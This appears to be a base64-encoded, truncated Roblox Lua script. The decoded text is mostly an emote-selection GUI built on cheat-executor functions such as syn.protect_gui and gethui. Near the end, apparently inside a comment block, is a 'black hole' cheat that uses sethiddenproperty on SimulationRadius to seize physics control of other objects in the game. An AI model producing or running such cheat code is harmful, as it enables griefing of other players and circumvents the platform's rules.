PSB0cnVlIHRoZW4KCQlFbW90ZU5hbWUuVGV4dCA9ICJTZWxlY3QgYW4gRW1vdGUiCgkJU2VhcmNoQmFyLlRleHQgPSAiIgoJCVNvcnRGcmFtZS5WaXNpYmxlID0gZmFsc2UKCQlTaXplRnJhbWUuVmlzaWJsZSA9IGZhbHNlCgkJR3JpZFNpemVGcmFtZS5WaXNpYmxlID0gZmFsc2UKCQlHdWlTZXJ2aWNlOlNldEVtb3Rlc01lbnVPcGVuKGZhbHNlKQoJCWlucHV0Y29ubmVjdCA9IFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBwcm9jZXNzZWQpCgkJCWlmIG5vdCBwcm9jZXNzZWQgdGhlbgoJCQkJaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIHRoZW4KCQkJCQlTY3JlZW5HdWkuRW5hYmxlZCA9IGZhbHNlCgkJCQllbmQKCQkJZW5kCgkJZW5kKQoJZWxzZQoJCWlucHV0Y29ubmVjdDpEaXNjb25uZWN0KCkKCWVuZAplbmQpCgppZiBub3QgSXNTdHVkaW8gdGhlbgoJR3VpU2VydmljZS5FbW90ZXNNZW51T3BlbkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpc29wZW4pCgkJaWYgaXNvcGVuIHRoZW4KCQkJU2NyZWVuR3VpLkVuYWJsZWQgPSBmYWxzZQoJCWVuZAoJZW5kKQplbmQKCkd1aVNlcnZpY2UuTWVudU9wZW5lZDpDb25uZWN0KGZ1bmN0aW9uKCkKCVNjcmVlbkd1aS5FbmFibGVkID0gZmFsc2UKZW5kKQoKaWYgbm90IGdhbWU6SXNMb2FkZWQoKSB0aGVuCglnYW1lLkxvYWRlZDpXYWl0KCkKZW5kCgpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmlmIElzU3R1ZGlvIHRoZW4KCVNjcmVlbkd1aS5QYXJlbnQgPSBMb2NhbFBsYXllci5QbGF5ZXJHdWkKZWxzZQoJbG9jYWwgU3luVjMgPSBzeW4gYW5kIERyYXdpbmdJbW1lZGlhdGUKCWlmIChub3QgaXNfc2lyaHVydF9jbG9zdXJlKSBhbmQgKG5vdCBTeW5WMykgYW5kIChzeW4gYW5kIHN5bi5wcm90ZWN0X2d1aSkgdGhlbgoJCXN5bi5wcm90ZWN0X2d1aShTY3JlZW5HdWkpCgkJU2NyZWVuR3VpLlBhcmVudCA9IENvcmVHdWkKCWVsc2VpZiBnZXRfaGlkZGVuX2d1aSBvciBnZXRodWkgdGhlbgoJCWxvY2FsIGhpZGRlblVJID0gZ2V0X2hpZGRlbl9ndWkgb3IgZ2V0aHVpCgkJU2NyZWVuR3VpLlBhcmVudCA9IGhpZGRlblVJKCkKCWVsc2UKCQlTY3JlZW5HdWkuUGFyZW50ID0gQ29yZUd1aQoJZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gU2VuZE5vdGlmaWNhdGlvbih0aXRsZSwgdGV4dCkKCWlmIChub3QgSXNTdHVkaW8pIGFuZCBzeW4gYW5kIHN5bi50b2FzdF9ub3RpZmljYXRpb24gdGhlbgoJCXN5bi50b2FzdF9ub3RpZmljYXRpb24oewoJCQlUeXBlID0gVG9hc3RUeXBlLkVycm9yLAoJCQlUaXRsZSA9IHRpdGxlLAoJCQlDb250ZW50ID0gdGV4dAoJCX0pCgllbHNlCgkJU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewoJCQlUaXRsZSA9IHRpdGxlLAoJCQlUZXh0ID0gdGV4dAoJCX0pCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBIdW1hbm9pZFBsYXlFbW90ZShodW1hbm9pZCwgbmFtZSwgaWQpCglpZiBJc1N0dWRpbyB0aGVuCgkJcmV0dXJuIGh1bWFub2lkOlBsYXlFbW90ZShuYW1lKQoJZWxzZQoJCXJldHVybiBodW1hbm9pZDpQbGF5RW1vdGVBbmRHZXRBbmltVHJhY2tCeUlkKGlkKQoJZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gUGxheUVtb3RlKG5hbWU6IHN0cmluZywgaWQ6IEludFZhbHVlKQoJaWYgc2hvdWxkQ2xvc2VPbkVtb3RlIHRoZW4KCQlTY3JlZW5HdWkuRW5hYmxlZCA9IGZhbHNlCgllbmQKCVNlYXJjaEJhci5UZXh0ID0gIiIKCWxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCglsb2NhbCBEZXNjcmlwdGlvbiA9IEh1bWFub2lkIGFuZCBIdW1hbm9pZDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkRGVzY3JpcHRpb24iKQoJaWYgbm90IERlc2NyaXB0aW9uIHRoZW4KCQlyZXR1cm4KCWVuZAoJaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlJpZ1R5cGUgfj0gRW51bS5IdW1hbm9pZFJpZ1R5cGUuUjE1IHRoZW4KCQlTZW5kTm90aWZpY2F0aW9uKAoJCQkicjY/IGxvbCIsCgkJCSJ5b3UgZ290dGEgYmUgcjE1IGR1ZGUiCgkJKQoJCXJldHVybgoJZW5kCglsb2NhbCBzdWNjLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCgkJSHVtYW5vaWRQbGF5RW1vdGUoSHVtYW5vaWQsIG5hbWUsIGlkKQoJZW5kKQoJaWYgbm90IHN1Y2MgdGhlbgoJCURlc2NyaXB0aW9uOkFkZEVtb3RlKG5hbWUsIGlkKQoJCUh1bWFub2lkUGxheUVtb3RlKEh1bWFub2lkLCBuYW1lLCBpZCkKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIFdhaXRGb3JDaGlsZE9mQ2xhc3MocGFyZW50LCBjbGFzcykKCWxvY2FsIGNoaWxkID0gcGFyZW50OkZpbmRGaXJzdENoaWxkT2ZDbGFzcyhjbGFzcykKCXdoaWxlIG5vdCBjaGlsZCBvciBjaGlsZC5DbGFzc05hbWUgfj0gY2xhc3MgZG8KCQljaGlsZCA9IHBhcmVudC5DaGlsZEFkZGVkOldhaXQoKQoJZW5kCglyZXR1cm4gY2hpbGQKZW5kCgpsb2NhbCBwYXJhbXMgPSBDYXRhbG9nU2VhcmNoUGFyYW1zLm5ldygpCnBhcmFtcy5Bc3NldFR5cGVzID0ge0VudW0uQXZhdGFyQXNzZXRUeXBlLkVtb3RlQW5pbWF0aW9ufQpwYXJhbXMuU29ydFR5cGUgPSBFbnVtLkNhdGFsb2dTb3J0VHlwZS5SZWNlbnRseUNyZWF0ZWQKcGFyYW1zLlNvcnRBZ2dyZWdhdGlvbiA9IEVudW0uQ2F0YWxvZ1NvcnRBZ2dyZWdhdGlvbi5BbGxUaW1lCnBhcmFtcy5JbmNsdWRlT2ZmU2FsZSA9IHRydWUKcGFyYW1zLkxpbWl0ID0gMTIwCgpsb2NhbCBmdW5jdGlvbiBnZXRDYXRhbG9nUGFnZSgpCglsb2NhbCBzdWNjZXNzLCBjYXRhbG9nUGFnZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQlyZXR1cm4gQXZhdGFyRWRpdG9yU2VydmljZTpTZWFyY2hDYXRhbG9nKHBhcmFtcykKCWVuZCkKCWlmIG5vdCBzdWNjZXNzIHRoZW4KCQl0YXNrLndhaXQoNSkKCQlyZXR1cm4gZ2V0Q2F0YWxvZ1BhZ2UoKQoJZW5kCglyZXR1cm4gY2F0YWxvZ1BhZ2UKZW5kCgpsb2NhbCBjYXRhbG9nUGFnZSA9IGdldENhdGFsb2dQYWdlKCkKCmxvY2FsIHBhZ2VzID0ge30KCndoaWxlIHRydWUgZG8KCWxvY2FsIGN1cnJlbnRQYWdlID0gY2F0YWxvZ1BhZ2U6R2V0Q3VycmVudFBhZ2UoKQoJdGFibGUuaW5zZXJ0KHBhZ2VzLCBjdXJyZW50UGFnZSkKCWlmIGNhdGFsb2dQYWdlLklzRmluaXNoZWQgdGhlbgoJCWJyZWFrCgllbmQKCWxvY2FsIGZ1bmN0aW9uIEFkdmFuY2VUb05leHRQYWdlKCkKCQlsb2NhbCBzdWNjZXNzID0gcGNhbGwoZnVuY3Rpb24oKQoJCQljYXRhbG9nUGFnZTpBZHZhbmNlVG9OZXh0UGFnZUFzeW5jKCkKCQllbmQpCgkJaWYgbm90IHN1Y2Nlc3MgdGhlbgoJCQl0YXNrLndhaXQoNSkKCQkJcmV0dXJuIEFkdmFuY2VUb05leHRQYWdlKCkKCQllbmQKCWVuZAoJQWR2YW5jZVRvTmV4dFBhZ2UoKQplbmQKCmxvY2FsIHRvdGFsRW1vdGVzID0ge30KZm9yIF8sIHBhZ2UgaW4gcGFpcnMocGFnZXMpIGRvCglmb3IgXywgZW1vdGUgaW4gcGFpcnMocGFnZSkgZG8KCQl0YWJsZS5pbnNlcnQodG90YWxFbW90ZXMsIGVtb3RlKQoJZW5kCmVuZAoKZm9yIGksIEVtb3RlIGluIHBhaXJzKHRvdGFsRW1vdGVzKSBkbwoJQWRkRW1vdGUoRW1vdGUuTmFtZSwgRW1vdGUuSWQsIEVtb3RlLlByaWNlKQplbmQKCmxvY2FsIFVHQ0Vtb3RlSWRzID0gewoJeyBpZCA9IDEzNDAwOTIwMDE0Nzk4NCwgbmFtZSA9ICJHb2pvIFN3YWdnZXIgU29kYSBXYWxrIiB9LAp9Cgpmb3IgXywgdWdjRW1vdGUgaW4gaXBhaXJzKFVHQ0Vtb3RlSWRzKSBkbwoJQWRkRW1vdGUodWdjRW1vdGUubmFtZSwgdWdjRW1vdGUuaWQsIG5pbCwgdHJ1ZSkKZW5kCgpBZGRFbW90ZSgiQXJtIFdhdmUiLCA1OTE1NzczMTU1KQpBZGRFbW90ZSgiSGVhZCBCYW5naW5nIiwgNTkxNTc3OTcyNSkKQWRkRW1vdGUoIkZhY2UgQ2FsaXN0aGVuaWNzIiwgOTgzMDczMTAxMikKCkxvYWRpbmc6RGVzdHJveSgpCgp0YWJsZS5zb3J0KEVtb3RlcywgZnVuY3Rpb24oYSwgYikKCXJldHVybiBhLmluZGV4IDwgYi5pbmRleAplbmQpCmZvciBpLHYgaW4gcGFpcnMoRW1vdGVzKSBkbwoJdi5zb3J0Lm5ld2VzdGZpcnN0ID0gaQplbmQKCnRhYmxlLnNvcnQoRW1vdGVzLCBmdW5jdGlvbihhLCBiKQoJcmV0dXJuIGEuaW5kZXggPiBiLmluZGV4CmVuZCkKZm9yIGksdiBpbiBwYWlycyhFbW90ZXMpIGRvCgl2LnNvcnQub2xkZXN0Zmlyc3QgPSBpCmVuZAoKdGFibGUuc29ydChFbW90ZXMsIGZ1bmN0aW9uKGEsIGIpCglyZXR1cm4gYS5uYW1lOmxvd2VyKCkgPCBiLm5hbWU6bG93ZXIoKQplbmQpCmZvciBpLHYgaW4gcGFpcnMoRW1vdGVzKSBkbwoJdi5zb3J0LmFscGhhYmV0aWNmaXJzdCA9IGkKZW5kCgp0YWJsZS5zb3J0KEVtb3RlcywgZnVuY3Rpb24oYSwgYikKCXJldHVybiBhLm5hbWU6bG93ZXIoKSA+IGIubmFtZTpsb3dlcigpCmVuZCkKZm9yIGksdiBpbiBwYWlycyhFbW90ZXMpIGRvCgl2LnNvcnQuYWxwaGFiZXRpY2xhc3QgPSBpCmVuZAoKdGFibGUuc29ydChFbW90ZXMsIGZ1bmN0aW9uKGEsIGIpCglyZXR1cm4gYS5wcmljZSA8IGIucHJpY2UKZW5kKQpmb3IgaSx2IGluIHBhaXJzKEVtb3RlcykgZG8KCXYuc29ydC5sb3dlc3RwcmljZSA9IGkKZW5kCgp0YWJsZS5zb3J0KEVtb3RlcywgZnVuY3Rpb24oYSwgYikKCXJldHVybiBhLnByaWNlID4gYi5wcmljZQplbmQpCmZvciBpLHYgaW4gcGFpcnMoRW1vdGVzKSBkbwoJdi5zb3J0LmhpZ2hlc3RwcmljZSA9IGkKZW5kCgp0YWJsZS5zb3J0KEVtb3RlcywgZnVuY3Rpb24oYSwgYikKCWlmIGEuaXNVR0MgPT0gYi5pc1VHQyB0aGVuCgkJcmV0dXJuIGEuaW5kZXggPCBiLmluZGV4CgllbmQKCXJldHVybiBhLmlzVUdDIGFuZCBub3QgYi5pc1VHQwplbmQpCmZvciBpLHYgaW4gcGFpcnMoRW1vdGVzKSBkbwoJdi5zb3J0LnVnY2ZpcnN0ID0gaQplbmQKCnRhYmxlLnNvcnQoRW1vdGVzLCBmdW5jdGlvbihhLCBiKQoJaWYgYS5pc1VHQyA9PSBiLmlzVUdDIHRoZW4KCQlyZXR1cm4gYS5pbmRleCA8IGIuaW5kZXgKCWVuZAoJcmV0dXJuIG5vdCBhLmlzVUdDIGFuZCBiLmlzVUdDCmVuZCkKZm9yIGksdiBpbiBwYWlycyhFbW90ZXMpIGRvCgl2LnNvcnQucm9ibG94Zmlyc3QgPSBpCmVuZAoKbG9jYWwgZnVuY3Rpb24gQ2hhcmFjdGVyQWRkZWQoQ2hhcmFjdGVyKQoJZm9yIGksdiBpbiBwYWlycyhGcmFtZTpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIG5vdCB2OklzQSgiVUlHcmlkTGF5b3V0IikgdGhlbgoJCQl2OkRlc3Ryb3koKQoJCWVuZAoJZW5kCglsb2NhbCBIdW1hbm9pZCA9IFdhaXRGb3JDaGlsZE9mQ2xhc3MoQ2hhcmFjdGVyLCAiSHVtYW5vaWQiKQoJbG9jYWwgRGVzY3JpcHRpb24gPSBIdW1hbm9pZDpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkRGVzY3JpcHRpb24iLCA1KSBvciBJbnN0YW5jZS5uZXcoIkh1bWFub2lkRGVzY3JpcHRpb24iLCBIdW1hbm9pZCkKCWxvY2FsIHJhbmRvbSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCglsb2NhbCBSYXRpbyA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiKQoJUmF0aW8uQXNwZWN0VHlwZSA9IEVudW0uQXNwZWN0VHlwZS5TY2FsZVdpdGhQYXJlbnRTaXplCglSYXRpby5QYXJlbnQgPSByYW5kb20KCXJhbmRvbS5MYXlvdXRPcmRlciA9IDAKCXJhbmRvbS5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJcmFuZG9tLkJvcmRlclNpemVQaXhlbCA9IDAKCXJhbmRvbS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41CglyYW5kb20uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKCXJhbmRvbS5UZXh0U2NhbGVkID0gdHJ1ZQoJcmFuZG9tLlRleHQgPSAiUmFuZG9tIgoJcmFuZG9tOlNldEF0dHJpYnV0ZSgibmFtZSIsICIiKQoJQ29ybmVyOkNsb25lKCkuUGFyZW50ID0gcmFuZG9tCglyYW5kb20uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJbG9jYWwgcmFuZG9tZW1vdGUgPSBFbW90ZXNbbWF0aC5yYW5kb20oMSwgI0Vtb3RlcyldCgkJUGxheUVtb3RlKHJhbmRvbWVtb3RlLm5hbWUsIHJhbmRvbWVtb3RlLmlkKQoJZW5kKQoJcmFuZG9tLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJRW1vdGVOYW1lLlRleHQgPSAiUmFuZG9tIgoJZW5kKQoJcmFuZG9tLlZpc2libGUgPSBzaG93UmFuZG9tCglyYW5kb20uUGFyZW50ID0gRnJhbWUKCWZvciBpLEVtb3RlIGluIHBhaXJzKEVtb3RlcykgZG8KCQlEZXNjcmlwdGlvbjpBZGRFbW90ZShFbW90ZS5uYW1lLCBFbW90ZS5pZCkKCQlsb2NhbCBFbW90ZUJ1dHRvbiA9IEluc3RhbmNlLm5ldygiSW1hZ2VCdXR0b24iKQoJCWxvY2FsIElzRmF2b3JpdGVkID0gdGFibGUuZmluZChGYXZvcml0ZWRFbW90ZXMsIEVtb3RlLmlkKQoJCUVtb3RlQnV0dG9uLkxheW91dE9yZGVyID0gRW1vdGUuc29ydFtDdXJyZW50U29ydF0gKyAoKElzRmF2b3JpdGVkIGFuZCAwKSBvciAjRW1vdGVzKQoJCUVtb3RlQnV0dG9uLk5hbWUgPSBFbW90ZS5pZAoJCUVtb3RlQnV0dG9uOlNldEF0dHJpYnV0ZSgibmFtZSIsIEVtb3RlLm5hbWUpCgkJQ29ybmVyOkNsb25lKCkuUGFyZW50ID0gRW1vdGVCdXR0b24KCQlFbW90ZUJ1dHRvbi5JbWFnZSA9IEVtb3RlLmljb24KCQlFbW90ZUJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41CgkJRW1vdGVCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMCkKCQlFbW90ZUJ1dHRvbi5Cb3JkZXJTaXplUGl4ZWwgPSAwCgkJUmF0aW86Q2xvbmUoKS5QYXJlbnQgPSBFbW90ZUJ1dHRvbgoJCWxvY2FsIEVtb3RlTnVtYmVyID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQoJCUVtb3RlTnVtYmVyLk5hbWUgPSAibnVtYmVyIgoJCUVtb3RlTnVtYmVyLlRleHRTY2FsZWQgPSB0cnVlCgkJRW1vdGVOdW1iZXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQlFbW90ZU51bWJlci5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQoJCUVtb3RlTnVtYmVyLkJvcmRlclNpemVQaXhlbCA9IDAKCQlFbW90ZU51bWJlci5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQoJCUVtb3RlTnVtYmVyLlNpemUgPSBVRGltMi5uZXcoMC4yLCAwLCAwLjIsIDApCgkJRW1vdGVOdW1iZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjksIDApCgkJRW1vdGVOdW1iZXIuVGV4dCA9IEVtb3RlLnNvcnRbQ3VycmVudFNvcnRdCgkJRW1vdGVOdW1iZXIuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkNlbnRlcgoJCUVtb3RlTnVtYmVyLlRleHRZQWxpZ25tZW50ID0gRW51bS5UZXh0WUFsaWdubWVudC5DZW50ZXIKCQlsb2NhbCBVSVN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQoJCVVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDAuNQoJCVVJU3Ryb2tlLlBhcmVudCA9IEVtb3RlTnVtYmVyCgkJRW1vdGVOdW1iZXIuUGFyZW50ID0gRW1vdGVCdXR0b24KCQlFbW90ZUJ1dHRvbi5QYXJlbnQgPSBGcmFtZQoJCUVtb3RlQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQlQbGF5RW1vdGUoRW1vdGUubmFtZSwgRW1vdGUuaWQpCgkJZW5kKQoJCUVtb3RlQnV0dG9uLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJCUVtb3RlTmFtZS5UZXh0ID0gRW1vdGUubmFtZQoJCWVuZCkKCQlsb2NhbCBGYXZvcml0ZSA9IEluc3RhbmNlLm5ldygiSW1hZ2VCdXR0b24iKQoJCUZhdm9yaXRlLk5hbWUgPSAiZmF2b3JpdGUiCgkJRmF2b3JpdGUuSW1hZ2UgPSBJc0Zhdm9yaXRlZCBhbmQgRmF2b3JpdGVPbiBvciBGYXZvcml0ZU9mZgoJCUZhdm9yaXRlLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpCgkJRmF2b3JpdGUuU2l6ZSA9IFVEaW0yLm5ldygwLjIsIDAsIDAuMiwgMCkKCQlGYXZvcml0ZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjksIDAsIDAuOSwgMCkKCQlGYXZvcml0ZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCgkJRmF2b3JpdGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQlGYXZvcml0ZS5WaXNpYmxlID0gc2hvd0Zhdm9yaXRlcwoJCUZhdm9yaXRlLlBhcmVudCA9IEVtb3RlQnV0dG9uCgkJRmF2b3JpdGUuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJCWxvY2FsIGluZGV4ID0gdGFibGUuZmluZChGYXZvcml0ZWRFbW90ZXMsIEVtb3RlLmlkKQoJCQlpZiBpbmRleCB0aGVuCgkJCQl0YWJsZS5yZW1vdmUoRmF2b3JpdGVkRW1vdGVzLCBpbmRleCkKCQkJCUZhdm9yaXRlLkltYWdlID0gRmF2b3JpdGVPZmYKCQkJCUVtb3RlQnV0dG9uLkxheW91dE9yZGVyID0gRW1vdGUuc29ydFtDdXJyZW50U29ydF0gKyAjRW1vdGVzCgkJCQlTZW5kTm90aWZpY2F0aW9uKCJGYXZvcml0ZXMgVXBkYXRlZCIsICJSZW1vdmVkICIgLi4gRW1vdGUubmFtZSAuLiAiIGZyb20gZmF2b3JpdGVzIikKCQkJZWxzZQoJCQkJdGFibGUuaW5zZXJ0KEZhdm9yaXRlZEVtb3RlcywgRW1vdGUuaWQpCgkJCQlGYXZvcml0ZS5JbWFnZSA9IEZhdm9yaXRlT24KCQkJCUVtb3RlQnV0dG9uLkxheW91dE9yZGVyID0gRW1vdGUuc29ydFtDdXJyZW50U29ydF0KCQkJCVNlbmROb3RpZmljYXRpb24oIkZhdm9yaXRlcyBVcGRhdGVkIiwgIkFkZGVkICIgLi4gRW1vdGUubmFtZSAuLiAiIHRvIGZhdm9yaXRlcyIpCgkJCWVuZAoJCQlXcml0ZUZpbGVGdW5jKCJGYXZvcml0ZWRFbW90ZXMudHh0IiwgSHR0cFNlcnZpY2U6SlNPTkVuY29kZShGYXZvcml0ZWRFbW90ZXMpKQoJCWVuZCkKCWVuZAoJZm9yIGk9MSw5IGRvCgkJbG9jYWwgRW1vdGVCdXR0b24gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKCQlFbW90ZUJ1dHRvbi5MYXlvdXRPcmRlciA9IDIxNDc0ODM2NDcKCQlFbW90ZUJ1dHRvbi5OYW1lID0gImZpbGxlciIKCQlFbW90ZUJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCUVtb3RlQnV0dG9uLkJvcmRlclNpemVQaXhlbCA9IDAKCQlSYXRpbzpDbG9uZSgpLlBhcmVudCA9IEVtb3RlQnV0dG9uCgkJRW1vdGVCdXR0b24uVmlzaWJsZSA9IHRydWUKCQlFbW90ZUJ1dHRvbi5QYXJlbnQgPSBGcmFtZQoJCUVtb3RlQnV0dG9uLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJCUVtb3RlTmFtZS5UZXh0ID0gIlNlbGVjdCBhbiBFbW90ZSIKCQllbmQpCgllbmQKZW5kCgppZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgoJQ2hhcmFjdGVyQWRkZWQoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKQplbmQKTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChDaGFyYWN0ZXJBZGRlZCkKLS1bWwpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBXb3Jrc3BhY2UgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCgpsb2NhbCBhbmdsZSA9IDEKbG9jYWwgcmFkaXVzID0gMTAKbG9jYWwgYmxhY2tIb2xlQWN0aXZlID0gZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIHNldHVwUGxheWVyKCkKICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKCiAgICBsb2NhbCBGb2xkZXIgPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIsIFdvcmtzcGFjZSkKICAgIGxvY2FsIFBhcnQgPSBJbnN0YW5jZS5uZXcoIlBhcnQiLCBGb2xkZXIpCiAgICBsb2NhbCBBdHRhY2htZW50MSA9IEluc3RhbmNlLm5ldygiQXR0YWNobWVudCIsIFBhcnQpCiAgICBQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgUGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgIFBhcnQuVHJhbnNwYXJlbmN5ID0gMQoKICAgIHJldHVybiBodW1hbm9pZFJvb3RQYXJ0LCBBdHRhY2htZW50MQplbmQKCmxvY2FsIGh1bWFub2lkUm9vdFBhcnQsIEF0dGFjaG1lbnQxID0gc2V0dXBQbGF5ZXIoKQoKaWYgbm90IGdldGdlbnYoKS5OZXR3b3JrIHRoZW4KICAgIGdldGdlbnYoKS5OZXR3b3JrID0gewogICAgICAgIEJhc2VQYXJ0cyA9IHt9LAogICAgICAgIFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMTQuNDYyNjI0MjQsIDE0LjQ2MjYyNDI0LCAxNC40NjI2MjQyNCkKICAgIH0KCiAgICBOZXR3b3JrLlJldGFpblBhcnQgPSBmdW5jdGlvbihwYXJ0KQogICAgICAgIGlmIHR5cGVvZihwYXJ0KSA9PSAiSW5zdGFuY2UiIGFuZCBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydDpJc0Rlc2NlbmRhbnRPZihXb3Jrc3BhY2UpIHRoZW4KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KE5ldHdvcmsuQmFzZVBhcnRzLCBwYXJ0KQogICAgICAgICAgICBwYXJ0LkN1c3RvbVBoeXNpY2FsUHJvcGVydGllcyA9IFBoeXNpY2FsUHJvcGVydGllcy5uZXcoMCwgMCwgMCwgMCwgMCkKICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIEVuYWJsZVBhcnRDb250cm9sKCkKICAgICAgICBMb2NhbFBsYXllci5SZXBsaWNhdGlvbkZvY3VzID0gV29ya3NwYWNlCiAgICAgICAgUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIHNldGhpZGRlbnByb3BlcnR5KExvY2FsUGxheWVyLCAiU2ltdWxhdGlvblJhZGl1cyIsIG1hdGguaHVnZSkKICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gcGFpcnMoTmV0d29yay5CYXNlUGFydHMpIGRvCiAgICAgICAgICAgICAgICBpZiBwYXJ0OklzRGVzY2VuZGFudE9mKFdvcmtzcGFjZSkgdGhlbgogICAgICAgICAgICAgICAgICAgIHBhcnQuVmVsb2NpdHkgPSBOZXR3b3JrLlZlbG9jaXR5CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgRW5hYmxlUGFydENvbnRyb2woKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEZvcmNlUGFydCh2KQogICAgaWYgdjpJc0EoIlBhcnQiKSBhbmQgbm90IHYuQW5jaG9yZWQgYW5kIG5vdCB2LlBhcmVudDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgbm90IHYuUGFyZW50OkZpbmRGaXJzdENoaWxkKCJIZWFkIikgYW5kIHYuTmFtZSB+PSAiSGFuZGxlIiB0aGVuCiAgICAgICAgZm9yIF8sIHggaW4gbmV4dCwgdjpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgIGlmIHg6SXNBKCJCb2R5QW5ndWxhclZlbG9jaXR5Iikgb3IgeDpJc0EoIkJvZHlGb3JjZSIpIG9yIHg6SXNBKCJCb2R5R3lybyIpIG9yIHg6SXNBKCJCb2R5UG9zaXRpb24iKSBvciB4OklzQSgiQm9keVRocnVzdCIpIG9yIHg6SXNBKCJCb2R5VmVsb2NpdHkiKSBvciB4OklzQSgiUm9ja2V0UHJvcHVsc2lvbiIpIHRoZW4KICAgICAgICAgICAgICAgIHg6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGlmIHY6RmluZEZpcnN0Q2hpbGQoIkF0dGFjaG1lbnQiKSB0aGVuCiAgICAgICAgICAgIHY6RmluZEZpcnN0Q2hpbGQoIkF0dGFjaG1lbnQiKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBpZiB2OkZpbmRGaXJzdENoaWxkKCJBbGlnblBvc2l0aW9uIikgdGhlbgogICAgICAgICAgICB2OkZpbmRGaXJzd